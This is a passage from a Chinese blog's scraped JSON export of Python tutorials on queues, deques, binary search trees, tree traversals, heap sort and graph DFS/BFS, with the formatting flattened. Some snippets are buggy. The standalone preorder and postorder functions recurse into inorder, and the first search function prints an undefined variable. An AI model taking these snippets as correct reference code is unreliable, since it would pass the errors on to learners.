i = i + 1 return atkdef decide_position(value): global queen i = 0 while i &lt; EIGHT: if attack(i, value) != 1: queen[value] = i if value == 7: print_table() else: decide_position(value + 1) i = i + 1# 主程序decide_position(0) 0x7.1.5老鼠走迷宫问题老鼠遵守以下三个原则： 1）一次只能走一格 2）遇到墙无法往前走，退回一步找找看能否有其他的路可走 3）走过的路不会再走第二次 可以采用二维数组MAZE[row][col]，并附和一下规则： 1.MAZE[i][j]=1,表示[i][j]处有墙，无法通过 2.MAZE[i][j]=0,表示[i][j]处无墙，可以通过 3.MAZE[1][1]是入口，MAZE[m][n]是出口。 可以使用链表的方式来记录已经走过的位置，并且将走过的位置对应的数组元素内容标记为2，然后阿静这个位置放入堆栈再进行下一次的选择。 该算法时每次进行移动时所执行的操作，其主要是判断当前所在位置的上、下、左、右是否还有可以前进的方格。如果找到可以前进的方格，则将该方格的编号加入记录移动路径的堆栈中，并往该方格移动；如果四周没有可走的方格时，也就是当前所在的方格无法走出迷宫，必须退回到前一格重新检查是否有其他的可走的路径。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798class Node: def __init__(self, x, y): self.x = x self.y = y self.next = Noneclass TraceRecord: def __init__(self): self.first = None self.last = None def isEmpty(self): return self.first == None def insert(self, x, y): newNode = Node(x, y) if self.first == None: self.first = newNode self.last = newNode else: self.last.next = newNode self.last = newNode def delete(self): if self.first == None: print('[队列已经空了]') return newNode = self.first while newNode.next != self.last: newNode = newNode.next newNode.next = self.last.next self.last = newNodeExitX = 8 # 定义出口的X坐标在第8行ExitY = 10 # 定义出口的Y坐标在第10列# 声明迷宫数组MAZE = [[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], \\ [1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1], \\ [1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1], \\ [1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1], \\ [1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1], \\ [1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1], \\ [1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1], \\ [1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1], \\ [1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1], \\ [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]]def chkExit(x, y, ex, ey): if x == ex and y == ey: if (MAZE[x - 1][y] == 1 or MAZE[x + 1][y] == 1 or MAZE[x][y - 1] == 1 or MAZE[x][y + 1] == 2): return 1 if (MAZE[x - 1][y] == 1 or MAZE[x + 1][y] == 1 or MAZE[x][y - 1] == 2 or MAZE[x][y + 1] == 1): return 1 if (MAZE[x - 1][y] == 1 or MAZE[x + 1][y] == 2 or MAZE[x][y - 1] == 1 or MAZE[x][y + 1] == 1): return 1 if (MAZE[x - 1][y] == 2 or MAZE[x + 1][y] == 1 or MAZE[x][y - 1] == 1 or MAZE[x][y + 1] == 1): return 1 return 0# 主程序path = TraceRecord()x = 1y = 1print('[迷宫的路径(0标记的部分)]')for i in range(10): for j in range(12): print(MAZE[i][j], end='') print()while x &lt;= ExitX and y &lt;= ExitY: MAZE[x][y] = 2 if MAZE[x - 1][y] == 0: x -= 1 path.insert(x, y) elif MAZE[x + 1][y] == 0: x += 1 path.insert(x, y) elif MAZE[x][y - 1] == 0: y -= 1 path.insert(x, y) elif MAZE[x][y + 1] == 0: y += 1 path.insert(x, y) elif chkExit(x, y, ExitX, ExitY) == 1: break else: MAZE[x][y] = 2 path.delete() x = path.last.x y = path.last.yprint('[老鼠走过的路径(2标记的部分)]')for i in range(10): for j in range(12): print(MAZE[i][j], end='') print() 0x7.2 队列0x7.2.1 数组实现队列与堆栈不同的是需要拥有两种基本操作：加入与删除，而且要使用front与rear两个指针来分别指向队列的前端与末尾，缺点是数组大小无法根据队列的实际需要来动态申请，只能说明固定的大小 1234MAXSIZE=4queue=[0]*MAXSIZEfront=-1rear=-1 # 队列为空时，front=-1,rear=-1 队列操作的过程用python语言将以数组操作队列的相关算法： 123456789101112131415161718192021222324252627def enqueue(item): # 将新数据加入Q的末尾，返回新队列 global rear global MAX_SIZE global queue if rear==MAX_SIZE-1: print(\"队列已满!\") else: rear+=1 queue[rear]=itemdef dequeue(item): # 删除队列前端的数据，返回新队列 global rear global MAX_SIZE global front global queue if front==rear: print(\"队列为空!\") else: front+=1 item=queue[front]def FRONT_VALUE(Queue): #返回队列前端的值 global rear global front global queue if front==rear: print(\"这是空队列!\") else: print(queue[front]) 范例:打印输出队列前端的值 1234567891011121314151617181920212223242526272829303132333435363738import sysMAX=10 #定义队列的大小queue=[0]*MAXfront=rear=-1choice=''while rear&lt;MAX-1 and choice !='e': choice=input('[a]表示加入一个数值，[d]表示取出一个数值，[e]表示跳出此程序: ') if choice=='a': val=int(input('[请输入数值]: ')) rear+=1 queue[rear]=val elif choice=='d': if rear&gt;front: front+=1 print('[取出数值为]: [%d]' %(queue[front])) queue[front]=0 else: print('[队列已经空了]') sys.exit(0) else: print()print('------------------------------------------')print('[输出队列中的所有元素]:')if rear==MAX-1: print('[队列已满]')elif front&gt;=rear: print('没有') print('[队列已空]')else: while rear&gt;front: front+=1 print('[%d] ' %queue[front],end='') print() print('------------------------------------------')print() 0x7.2.2链表实现队列 12345678910class student: def __init__(self): self.name=\" \"*20 self.score=0 self.next=None front=student()rear=student()front=Nonerear=None 在队列中加入新的节点，等于加到此队列的末端；在队列中删除节点，就是将此队列最前端的节点删除 123456789101112131415161718192021def enqueue(name,score): global front global rear new_data=student() new_data.name=name new_data.score=score if rear==None: front=new_data else: rear.next=new_data rear=new_data new_data.next=Nonedef dequeue(): global front global rear if front==None: print(\"队列已空!\") else: print(\"姓名：%s\\t成绩：%d...取出\" %(front.name,front.score)) front=front.next 范例:链表中元素节点仍为学生姓名及成绩的结构数据 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758class student: def __init__(self): self.name=' '*20 self.score=0 self.next=None front=student()rear=student()front=Nonerear=Nonedef enqueue(name, score): # 把数据加入队列 global front global rear new_data=student() # 分配内存给新元素 new_data.name=name # 给新元素赋值 new_data.score = score if rear==None: # 如果rear为None，表示这是第一个元素 front = new_data else: rear.next = new_data # 将新元素连接到队列末尾 rear = new_data # 将rear指向新元素，这是新的队列末尾 new_data.next = None # 新元素之后无其他元素def dequeue(): # 取出队列中的数据 global front global rear if front == None: print('队列已空！') else: print('姓名：%s\\t成绩：%d ....取出' %(front.name, front.score)) front = front.next # 将队列前端移到下一个元素 def show(): # 显示队列中的数据 global front global rear ptr = front if ptr == None: print('队列已空！') else: while ptr !=None: # 从front到rear遍历队列 print('姓名：%s\\t成绩：%d' %(ptr.name, ptr.score)) ptr = ptr.nextselect=0while True: select=int(input('(1)加入 (2)取出 (3)显示 (4)离开 =&gt; ')) if select==4: break if select==1: name=input('姓名: ') score=int(input('成绩: ')) enqueue(name, score) elif select==2: dequeue() else: show() 0x 7.2.3双向队列双向队列(Double Ended Queues,DEQue)为一个有序线性表，加入与删除可在队列的任意一端进行双向队列的应用可以区分为两种：第一种是数据只能从一端加入，但可从两端取出；；另一种则是可从两端加入，但从一端取出范例: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273class Node: def __init__(self): self.data=0 self.next=None front=Node()rear=Node()front=Nonerear=None#方法enqueue:队列数据的加入def enqueue(value): global front global rear node=Node() #建立节点 node.data=value node.next=None #检查是否为空队列 if rear==None: front=node #新建立的节点成为第1个节点 else: rear.next=node #将节点加入到队列的末尾 rear=node #将队列的末尾指针指向新加入的节点#方法dequeue:队列数据的取出def dequeue(action): global front global rear #从队列前端取出数据 if not(front==None) and action==1: if front==rear: rear=None value=front.data #将队列数据从前端取出 front=front.next #将队列的前端指针指向下一个 return value #从队列末尾取出数据 elif not(rear==None) and action==2: startNode=front #先记下队列前端的指针值 value=rear.data #取出队列当前末尾的数据 #查找队列末尾节点的前一个节点 tempNode=front while front.next!=rear and front.next!=None: front=front.next tempNode=front front=startNode #记录从队列末尾取出数据后的队列前端指针 rear=tempNode #记录从队列末尾取出数据后的队列末尾指针 #下一行程序是指当队列中仅剩下最后一个节点时, #取出数据后便将front和rear指向None if front.next==None or rear.next==None: front=None rear=None return value else: return -1 print('用链表来实现双向队列')print('====================================')ch='a'while True: ch=input('加入请按 a,取出请按 d,结束请按 e:') if ch =='e': break elif ch=='a': item=int(input('加入的元素值:')) enqueue(item) elif ch=='d': temp=dequeue(1) print('从双向队列前端按序取出的元素数据值为：%d' %temp) temp=dequeue(2) print('从双向队列末尾按序取出的元素数据值为：%d' %temp) else: break 0x8 树形结构及其算法树形结构是一种应用相当广泛的非线性结构。树状算法在程序中的建立与应用大多使用链表来处理，当然也可以使用数组这样的连续内存来表示二叉树 由于二叉树的应用相当广泛，因此衍生了许多特殊的二叉树结构1.满二叉树(fully binary tree)如果二叉树的高度为h，树的节点数为2-1，h&gt;=0,就称此树为”满二叉树”2.完全二叉树(complete binary tree)如果二叉树的高速为h，所含的节点数小于2-1，但其节点的编号方式如同高度为h的满二叉树一样，从左到右，从上到下的顺序一一对应对于完全二叉树而言，假设有N个节点，那么此二叉树的层数h为log(N+1) 3.斜二叉树(skewed binary tree)当一个二叉树完全没有左节点或右节点时，就称为左斜二叉树或右斜二叉树4.严格二叉树(strictly binary tree)二叉树中的每一个非终端节点均有非空的左右子树0x8.1数组实现二叉树使用有序的一位数组来表示二叉树，首先可将此二叉树假想成一棵满二叉树，而且第K层具有2个节点，按序存放在一维数组中 首先来看看使用一维数组建立二叉树的表示方法以及数组索引值的设置 索引值 1 2 3 4 5 6 7 内容值 A B C D 一维数组中的索引值有以下关系：1.左子树索引值是父节点索引值乘22.右子树索引值是父节点索引值乘2加1 二叉查找树具有以下特点：1.可以是空集合，若不是空集合，则节点上一定要有一个键值2.每一个树根的值需大于左子树的值3.每一个树根的值需小于右子树的值4.左右子树也是二叉查找树5.树的每个节点值都不相同范例：现在示范用一组数据(32,25,16,35,27)来建立一棵二叉查找树，具体过程如下 12345678910111213141516171819202122def Btree_create(btree,data,length): for i in range(1,length): level=1 while btree[level]!=0: if data[i]&gt;btree[level]: #如果数组内的值大于树根，则往右子树比较 level=level*2+1 else: #如果数组内的值小于或等于树根，则往左子树比较 level=level*2 btree[level]=data[i] #把数组值放入二叉树 length=9data=[0,6,3,5,4,7,8,9,2] #原始数组btree=[0]*16 #存放二叉树数组print('原始数组内容：')for i in range(length): print('[%2d] ' %data[i],end='')print('')Btree_create(btree,data,9)print('二叉树内容：')for i in range(1,16): print('[%2d] ' %btree[i],end='')print() 0x8.2 链表实现二叉树链表实现二叉树，就是使用功能链表来存储二叉树。使用链表来表示二叉树的好处是对于节点的增加与删除相当容易，缺点是很难找到父节点，除非在每一节点多增加一个父字段 12345class tree: def __init__(self): self.data=0 self.left=None self.right=None 链表实现二叉树的示意图： 以链表方式建立二叉树的python算法： 123456789101112131415161718192021def create_tree(root,val): #建立二叉树的函数 newnode=tree() newnode.data=val newnode.left=None newnode.right=None if root==None: root=newnode return root else: current=root while current!=None: backup=current if current.data &gt; val: current=current.left else: current=current.right if backup.data &gt;val: backup.left=newnode else: backup.right=newnode return root 范例:按序输入一棵二叉树10个节点的数据，分别是5,6,24,8,12,3,17,1,9，并使用链表来建立二叉树。最后输出左，右子树 123456789101112131415161718192021222324252627282930313233343536373839404142434445class tree: def __init__(self): self.data=0 self.left=None self.right=Nonedef create_tree(root,val): #建立二叉树的函数 newnode=tree() newnode.data=val newnode.left=None newnode.right=None if root==None: root=newnode return root else: current=root while current!=None: backup=current if current.data &gt; val: current=current.left else: current=current.right if backup.data &gt;val: backup.left=newnode else: backup.right=newnode return rootdata=[5,6,24,8,12,3,17,1,9]ptr=Noneroot=Nonefor i in range(9): ptr=create_tree(ptr,data[i]) #建立二叉树print('左子树:')root=ptr.leftwhile root!=None: print('%d' %root.data) root=root.leftprint('--------------------------------')print('右子树:')root=ptr.rightwhile root!=None: print('%d' %root.data) root=root.rightprint() 0x8.3二叉树遍历所谓二叉树的遍历(Binary Tree Traversal)，最简单的说法就是”访问树中所有的节点各一次”，并且在遍历后，将树中的数据转化为线性关系 简单二叉树节点而言，每个节点都可分为左右两个分支可以有ABC，ACB，BAC，BCA，CAB，CBA一共6种遍历方法。如果按照二叉树特性，一律从左到右，那么就只剩下三种遍历方式，分别是BAC，ABC，BCA三种。这三种方式的命名与规则如下： 中序遍历(BAC，Inorder)：左子树—&gt;树根—&gt;右子树前序遍历(ABC，Preorder)：树根—&gt;左子树—&gt;右子树后序遍历(BCA，Postorder)：左子树—&gt;右子树—&gt;树根1.中序遍历中序遍历(Inorder Traversal)是”左中右”的遍历顺序，也就是从树的左侧逐步向下方移动，直到无法移动，再访问此节点，并向右移动一节点。如果无法再向右移动时，可以返回上层的父节点，并重复左，中，右的步骤： 遍历左子树遍历(或访问)树根遍历右子树中序遍历结果：FDHGIBEAC中序遍历的递归算法如下： 12345def inorder(ptr): #中序遍历子程序 if ptr!=None: inorder(ptr.left) print('[%2d] ' %ptr.data, end='') inorder(ptr.right) 2.后序遍历后序遍历(Postorder Traversal)是”左右中”的遍历顺序，就是先遍历左子树，在遍历右子树，最后遍历(或访问)根节点。反复执行此步骤 遍历左子树遍历右子树遍历树根后序遍历结果：FHIGDEBCA 后序遍历的递归算法如下： 12345def postorder(ptr): #后序遍历子程序 if ptr!=None: inorder(ptr.left) inorder(ptr.right) print('[%2d] ' %ptr.data, end='') 3.前序遍历前序遍历(Preorder Traversal)是”中左右”的遍历顺序，也就是先从根节点遍历，再往左方移动，当无法继续时，继续向右方移动，接着再重复执行此步骤： 遍历树根遍历左子树遍历右子树前序遍历结果：ABDFGHIEC 前序遍历的递归算法： 12345def preorder(ptr): #前序遍历子程序 if ptr!=None: print('[%2d] ' %ptr.data, end='') inorder(ptr.left) inorder(ptr.right) 范例:按序输入一棵二叉树节点的数据，分别是5,6,24,8,12,3,17,1,9，利用链表来建立二叉树，最后进行中序遍历，轻松完成从小到大的排序 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class tree: def __init__(self): self.data = 0 self.left = None self.right = Nonedef inorder(ptr): # 中序遍历子程序 if ptr != None: inorder(ptr.left) print('[%2d] ' % ptr.data, end='') inorder(ptr.right)def create_tree(root, val): # 建立二叉树的函数 newnode = tree() newnode.data = val newnode.left = None newnode.right = None if root == None: root = newnode return root else: current = root while current != None: backup = current if current.data &gt; val: current = current.left else: current = current.right if backup.data &gt; val: backup.left = newnode else: backup.right = newnode return root# 主程序data = [5, 6, 24, 8, 12, 3, 17, 1, 9]ptr = Noneroot = Nonefor i in range(9): ptr = create_tree(ptr, data[i]) # 建立二叉树print('====================')print('排序完成的结果：')inorder(ptr) # 中序遍历print('') 0x 8.4 二叉树的查找二叉树在建立的过程中，是根据左子树&lt;树根&lt;右子树的原则建立的，因此只需从树根出发比较键值，如果比数根大就往右，否则往左而下，直到相等就找到了要查找的值，如果比到None，无法在前进就代表查找不到此值 二叉树查找的算法： 1234567891011def search(ptr,val): #查找二叉树中某个值的子程序 while True: if ptr==None: #没找到就返回None return None if ptr.data==val: #节点值等于查找值 print('共查找 %3d 次' %i) return ptr elif ptr.data &gt; val: #节点值大于查找值 ptr=ptr.left else: ptr=ptr.right 范例：建立一个二叉树找树，并输入要查找的值。二叉树节点的数据按序依次为7,1,4,2,8,13,12,11,15,9,5 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class tree: def __init__(self): self.data=0 self.left=None self.right=Nonedef create_tree(root,val): #建立二叉树的函数 newnode=tree() newnode.data=val newnode.left=None newnode.right=None if root==None: root=newnode return root else: current=root while current!=None: backup=current if current.data &gt; val: current=current.left else: current=current.right if backup.data &gt;val: backup.left=newnode else: backup.right=newnode return rootdef search(ptr,val): #查找二叉树中某个值的子程序 i=1 while True: if ptr==None: #没找到就返回None return None if ptr.data==val: #节点值等于查找值 print('共查找 %3d 次' %i) return ptr elif ptr.data &gt; val: #节点值大于查找值 ptr=ptr.left else: ptr=ptr.right i+=1#主程序arr=[7,1,4,2,8,13,12,11,15,9,5]ptr=Noneprint('[原始数组内容]')for i in range(11): ptr=create_tree(ptr,arr[i]) #建立二叉树 print('[%2d] ' %arr[i],end='')print()data=int(input('请输入查找值：'))if search(ptr,data) !=None : #在二叉树中查找 print('您要找的值 [%3d] 找到了!!' %data)else: print('您要找的值没找到!!') 0x8.5二叉树节点的插入二叉树插入 的情况和查找相似，重点是插入后仍要保持二叉查找数的特性。 12345if search(ptr,data)!=None: #在二叉树中查找 print('二叉树中有此节点了!')else: ptr=create_tree(ptr,data) inorder(ptr) 范例:二叉树的节点数据按序为7,1,4,2,8,13,12,11,15,9，然后输入一个键值，如果不在此二叉树中，就将其加入到二叉树 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960class tree: def __init__(self): self.data=0 self.left=None self.right=Nonedef create_tree(root,val): #建立二叉树的函数 newnode=tree() newnode.data=val newnode.left=None newnode.right=None if root==None: root=newnode return root else: current=root while current!=None: backup=current if current.data &gt; val: current=current.left else: current=current.right if backup.data &gt;val: backup.left=newnode else: backup.right=newnode return rootdef search(ptr,val): #在二叉树中查找某个值的子程序 while True: if ptr==None: #没找到就返回None return None if ptr.data==val: #节点值等于查找值 return ptr elif ptr.data &gt; val: #节点值大于查找值 ptr=ptr.left else: ptr=ptr.rightdef inorder(ptr): #中序遍历子程序 if ptr!=None: inorder(ptr.left) print('[%2d] ' %ptr.data, end='') inorder(ptr.right)#主程序arr=[7,1,4,2,8,13,12,11,15,9,5]ptr=Noneprint('[原始数组内容]')for i in range(11): ptr=create_tree(ptr,arr[i]) #建立二叉树 print('[%2d] ' %arr[i],end='')print()data=int(input('请输入要查找的键值：'))if search(ptr,data)!=None: #在二叉树中查找 print('二叉树中有此节点了!')else: ptr=create_tree(ptr,data) inorder(ptr) 0x8.6二叉树的删除二叉树节点的删除操作则稍为复杂，可分为以下三种情况：1.删除的节点为树叶，只要将其相连的父节点指向None即可2.删除的节点只有一棵子树。如下图：删除节点1，就将其右指针字段放在父节点的左指针字段3.删除的节点有两棵子树。如下图：要删除节点4，方式有两种，虽然结果不同，但都可符合二叉树特性 3.1 找出中序立即先行者(inorder immediate predecessor)，就是将欲删除节点的左子树中最大者向上提，在此即为上图中的节点2。简单来说，就是在该节点的左子树，往右寻找，直到右指针为None，这节点就是中序立即先行者 3.2 找出中序立即后续者(inorder immediate successor)，就是把要删除节点的右子树中最小者向上提，在此即为上图中的节点5。简单来说，就是在该节点的右子树，往左寻找，直到左指针为None，这个节点就是中序立即后续者0x8.7二叉树的删除堆积排序法算是选择排序法的改进版，它可以减少在选择排序法中的比较次数，进而减少排序时间。堆积树是一种特殊的二叉树，可分为最大堆积树和最小堆积树两种。 最大堆积树满足以下3个条件：它是一个完全二叉树所有节点的值都大于或等于它左右子节点的值树根是堆积树中最大的 最小堆积树满足以下3个条件：它是一个完全二叉树所有节点的值都小于或等于它左右子节点的值树根是堆积树中最小的假设有9项数据32,17,16,24,35,87,65,4,12，以二叉树表示：如果要将该二叉树转换堆积树(heap tree)，我们可以用数组来存储二叉树所有节点的值，即： 123A[0]=32，A[1]=17，A[2]=16，A[3]=24，A[4]=35，A[5]=87A[6]=65，A[7]=4，A[8]=12 步骤01：A[0]=32为树根，若A[1]大于父节点，则必须互换。此处A[1]=17&lt;A[0]=32故不交换 步骤02：A[2]=16&lt;A[0]，故不交换 步骤03：A[3]=24&gt;A[1]=17，故交换，如下图 步骤04：A[4]=35&gt;A[1]=24，故交换，再与A[0]=32比较，A[1]=35&gt;A[0]=32，故交换，如下图步骤05：A[5]=87&gt;A[2]=16，故交换，再与A[0]=35比较，A[2]=87&gt;A[0]=35，故交换，如下图步骤06：A[6]=65&gt;A[2]=35，故交换，且A[2]=65&lt;A[0]=87，故不交换，如下图步骤07：A[7]=4&lt;A[3]=17，故不交换，A[8]=12&lt;A[3]=17，故不交换范例:使用堆积排序法来排序 12345678910111213141516171819202122232425262728293031323334353637383940414243444546def heap(data, size): for i in range(int(size / 2), 0, -1): # 建立堆积树节点 ad_heap(data, i, size - 1) print() print('堆积的内容：', end='') for i in range(1, size): # 原始堆积树的内容 print('[%2d] ' % data[i], end='') print('\\n') for i in range(size - 2, 0, -1): # 堆积排序 data[i + 1], data[1] = data[1], data[i + 1] # 头尾节点交换 ad_heap(data, 1, i) # 处理剩余节点 print('处理过程为：', end='') for j in range(1, size): print('[%2d] ' % data[j], end='') print()def ad_heap(data, i, size): j = 2 * i tmp = data[i] post = 0 while j &lt;= size and post == 0: if j &lt; size: if data[j] &lt; data[j + 1]: # 找出最大节点 j += 1 if tmp &gt;= data[j]: # 若树根较大，结束比较过程 post = 1 else: data[int(j / 2)] = data[j] # 若树根较小，则继续比较 j = 2 * j data[int(j / 2)] = tmp # 指定树根为父节点def main(): data = [0, 5, 6, 4, 8, 3, 2, 7, 1] # 原始数组的内容 size = 9 print('原始数组为：', end='') for i in range(1, size): print('[%2d] ' % data[i], end='') heap(data, size) # 建立堆积树 print('排序结果为：', end='') for i in range(1, size): print('[%2d] ' % data[i], end='')main() 0x9图的数据结构及其算法图除了被应用在数据结构中最短路径搜索，拓扑排序外，还能应用在系统分析中以时间为评审标准的性能评审技术等。采用Dijkstra这种图形算法就能快速寻找出两个节点之间的最短路径图的遍历，可以定义如下：一个图G=(V,E)，存在某一顶点v属于V，我们希望从v开始，通过此节点相邻的节点而去访问图G中的其他节点，这就被称为”图的遍历”。也就是从某一个顶点V1开始，遍历可以经过V1到达的顶点，接着遍历下一个顶点直到全部的顶点遍历完毕为止0x9.1图的遍历算法图遍历的方法有两种：即”深度优先遍历”和”广度优先遍历”，也称为”深度优先搜索”和”广度优先搜索”1.深度优先遍历的方式有点类似于前序遍历，从图的某一顶点开始遍历，被访问过的顶点就做上已访问的记号，接着遍历此顶点所有相邻且未访问过的顶点中的任意一个顶点，并做上已访问的记号，再以该点为新的起点继续进行深度优先搜索 这种图的遍历方法结合了递归和堆栈两种数据结构的技巧，由于此方法会造成无限循环，因此必须加入一个变量，判断该点是否已经遍历完毕深度优先函数的算法如下： 12345678def dfs(current): #深度优先函数 run[current]=1 print('[%d] ' %current, end='') ptr=head[current].next while ptr!=None: if run[ptr.val]==0: #如果顶点尚未遍历， dfs(ptr.val) #就进行dfs的递归调用 ptr=ptr.next 范例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556class list_node: def __init__(self): self.val = 0 self.next = Nonehead = [list_node()] * 9 # 声明一个节点类型的链表数组run = [0] * 9def dfs(current): # 深度优先函数 run[current] = 1 print('[%d] ' % current, end='') ptr = head[current].next while ptr != None: if run[ptr.val] == 0: # 如果顶点尚未遍历， dfs(ptr.val) # 就进行dfs的递归调用 ptr = ptr.next# 声明图的边线数组data = [[1, 2], [2, 1], [1, 3], [3, 1], \\ [2, 4], [4, 2], [2, 5], [5, 2], \\ [3, 6], [6, 3], [3, 7], [7, 3], \\ [4, 8], [8, 4], [5, 8], [8, 5], \\ [6, 8], [8, 6], [8, 7], [7, 8]]for i in range(1, 9): # 共有八个顶点 run[i] = 0 # 把所有顶点设置成尚未遍历过 head[i] = list_node() head[i].val = i # 设置各个链表头的初值 head[i].next = None ptr = head[i] # 设置指针指向链表头 for j in range(20): # 二十条边线 if data[j][0] == i: # 如果起点和链表头相等，则把顶点加入链表 newnode = list_node() newnode.val = data[j][1] newnode.next = None while True: ptr.next = newnode # 加入新节点 ptr = ptr.next if ptr.next == None: breakprint('图的邻接表内容：') # 打印图的邻接表内容for i in range(1, 9): ptr = head[i] print('顶点 %d=&gt; ' % i, end='') ptr = ptr.next while ptr != None: print('[%d] ' % ptr.val, end='') ptr = ptr.next print()print('深度优先遍历的顶点：') # 打印深度优先遍历的顶点dfs(1)print() 2.广度优先遍历法广度优先(Breadth-FIrst Search，BFS)遍历法则是使用队列和递归技巧来遍历，也是从图的某一顶点开始遍历，被访问过的顶点就做上已访问的记号。接着遍历此顶点的所有相邻且未访问过的顶点中的任意一个顶点，并做上已访问的记号，再以该点为新的起点继续进行广度优先的遍历广度优先函数的python函数： 123456789101112131415161718#广度优先查找法def bfs(current): global front global rear global Head global run enqueue(current) #将第一个顶点存入队列 run[current]=1 #将遍历过的顶点设置为1 print('[%d]' %current, end='') #打印出该遍历过的顶点 while front!=rear: #判断当前的队伍是否为空 current=dequeue() #将顶点从队列中取出 tempnode=Head[current].first #先记录当前顶点的位置 while tempnode!=None: if run[tempnode.x]==0: enqueue(tempnode.x) run[tempnode.x]=1 #记录已遍历过 print('[%d]' %tempnode.x,end='') tempnode=tempnode.next 范例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495MAXSIZE=10 #定义队列的最大容量 front=-1 #指向队列的前端rear=-1 #指向队列的末尾class Node: def __init__(self,x): self.x=x #顶点数据 self.next=None #指向下一个顶点的指针 class GraphLink: def __init__(self): self.first=None self.last=None def my_print(self): current=self.first while current!=None: print('[%d]' %current.x,end='') current=current.next print() def insert(self,x): newNode=Node(x) if self.first==None: self.first=newNode self.last=newNode else: self.last.next=newNode self.last=newNode #队列数据的存入def enqueue(value): global MAXSIZE global rear global queue if rear&gt;=MAXSIZE: return rear+=1 queue[rear]=value #队列数据的取出def dequeue(): global front global queue if front==rear: return -1 front+=1 return queue[front]#广度优先查找法def bfs(current): global front global rear global Head global run enqueue(current) #将第一个顶点存入队列 run[current]=1 #将遍历过的顶点设置为1 print('[%d]' %current, end='') #打印出该遍历过的顶点 while front!=rear: #判断当前的队伍是否为空 current=dequeue() #将顶点从队列中取出 tempnode=Head[current].first #先记录当前顶点的位置 while tempnode!=None: if run[tempnode.x]==0: enqueue(tempnode.x) run[tempnode.x]=1 #记录已遍历过 print('[%d]' %tempnode.x,end='') tempnode=tempnode.next#声明图的边线数组Data=[[0]*2 for row in range(20)]Data =[[1,2],[2,1],[1,3],[3,1],[2,4], \\ [4,2],[2,5],[5,2],[3,6],[6,3], \\ [3,7],[7,3],[4,5],[5,4],[6,7],[7,6],[5,8],[8,5],[6,8],[8,6]]run=[0]*9 #用来记录各顶点是否遍历过queue=[0]*MAXSIZEHead=[GraphLink]*9 print('图的邻接表内容：') #打印图的邻接表内容for i in range(1,9): #共有8个顶点 run[i]=0 #把所有顶点设置成尚未遍历过 print('顶点%d=&gt;' %i,end='') Head[i]=GraphLink() for j in range(20): if Data[j][0]==i: #如果起点和链表头相等，则把顶点加入链表 DataNum = Data[j][1] Head[i].insert(DataNum) Head[i].my_print() #打印图的邻接标内容print('广度优先遍历的顶点：') #打印广度优先遍历的顶点bfs(1)print() 后面0x9.2最小生成树生成树又称”花费树”，“出本树”或”值树”，一个图的生成树(spanning tree)就是以最少的边来连通图中所有的顶点，且不造成回路(cycle)的树形结构。假设在树的边加上一个权重(weight)值，这种图就成为”加权图(weighted graph)”。如果这个权重值代表两个顶点间的距离(distance)或成本(cost)，这类图就被称为网络(network)介绍以所谓”贪婪法则”(Greedy Rule)为基础来求得一个无向连通图的最小生成树的常见问题，分别是Prim算法和Kruskal算法0x9.3 图的最短路径法图的这章可详细看:https://blog.csdn.net/V_lq6h/article/details/86743787参考书本:图解算法——使用Python http://m.bookdao.com/book.aspx?bookid=3346564 数据结构–python 第八章 排序https://blog.csdn.net/Jasminexjf/article/details/89379735查找与哈希算法 https://blog.csdn.net/V_lq6h/article/details/86743773数组与链表算法:https://www.cnblogs.com/LQ6H/p/10346666.html堆栈https://blog.csdn.net/jasminexjf/article/details/89295924python算法 https://www.cnblogs.com/LQ6H/default.html?page=5图的数据结构及其算法 https://blog.csdn.net/V_lq6h/article/details/86743787","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://blog.cfyqy.com/tags/%E7%AE%97%E6%B3%95/"}],"author":"ye1s"},{"title":"云计算复习","slug":"复习-1","date":"2019-05-21T11:17:00.000Z","updated":"2020-04-13T08:27:20.065Z","comments":true,"path":"article/93af3f24.html","link":"","permalink":"https://blog.cfyqy.com/article/93af3f24.html","excerpt":"又要背好多。咳咳……","text":"又要背好多。咳咳……","categories":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"云计算","slug":"云计算","permalink":"https://blog.cfyqy.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"}],"author":"ye1s"},{"title":"leetcode","slug":"titled","date":"2019-05-21T07:24:45.000Z","updated":"2020-04-13T08:24:44.915Z","comments":true,"path":"article/503970b4.html","link":"","permalink":"https://blog.cfyqy.com/article/503970b4.html","excerpt":"","text":"大一大二的时候，老师布置的编程作业大部分都是参照别人的，看看别人的代码写法，理解就行意思就行，很少自己动手去写，导致现在编程能力特别的差，有点挺后悔的。现在确实该每天花点时间敲敲代码，刷刷编程题，提高自己的编程能力了。找个一个刷题平台，准备坚持每天刷几题，加油！ 国内版:https://leetcode-cn.com/problemset/all/国外版(要翻墙):https://leetcode.com/辅助工具:https://github.com/jdneo/vscode-leetcode 算法0x1 两数 之和给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。 你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。 示例: 给定 nums = [2, 7, 11, 15], target = 9 因为 nums[0] + nums[1] = 2 + 